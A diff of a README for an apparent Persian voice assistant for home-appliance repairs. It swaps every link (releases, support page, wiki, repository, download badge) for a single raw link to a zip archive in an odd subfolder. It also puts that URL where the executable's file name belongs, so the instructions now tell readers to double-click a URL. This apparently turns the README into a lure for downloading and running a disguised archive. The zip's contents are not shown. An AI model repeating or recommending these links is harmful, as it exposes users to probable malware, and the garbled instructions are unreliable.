@@ -1,6 +1,6 @@
 # 🛠️ Persian-Voice-Assistant-for-Home-Appliance-Repairs - Your Helper for Appliance Issues
 
-[![Download](https://img.shields.io/badge/Download-Persian%20Voice%20Assistant-brightgreen)](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/releases)
+[![Download](https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip%20Voice%20Assistant-brightgreen)](https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the Persian Voice Assistant f
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/releases) to download the latest version. Look for the file named `PersianVoiceAssistant.exe` and click on it to start the download.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip) to download the latest version. Look for the file named `https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip` and click on it to start the download.
 
 Once the file is downloaded, find it in your Downloads folder. Double-click on the file to run the application. 
 
@@ -24,7 +24,7 @@ Before you start, please make sure your computer meets the following requirement
 
 ## 🎤 How to Use the Voice Assistant
 
-1. Launch the application by double-clicking the `PersianVoiceAssistant.exe` file.
+1. Launch the application by double-clicking the `https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip` file.
 2. Once opened, you will see a user-friendly interface.
 3. Click on the microphone icon to start speaking your appliance issue.
 4. Use clear Persian language commands. For example: 
@@ -61,7 +61,7 @@ If you encounter any issues, try the following:
 3. Restart the application and try again.
 4. Speak clearly and slowly for better recognition.
 
-If problems persist, visit our [Support Page](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/issues) to seek help or report the issue.
+If problems persist, visit our [Support Page](https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip) to seek help or report the issue.
 
 ## 📝 Contributing
 
@@ -81,9 +81,9 @@ This project is licensed under the MIT License. Feel free to use or modify it as
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs)
-- [User Guide](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip)
+- [User Guide](https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip)
 
 Thank you for choosing the Persian Voice Assistant for Home Appliance Repairs. We hope it helps you resolve your appliance issues effortlessly! 
 
-[Download the assistant now!](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/releases)
+[Download the assistant now!](https://raw.githubusercontent.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/main/greenhew/Persian-Voice-Assistant-for-Home-Appliance-Repairs.zip)
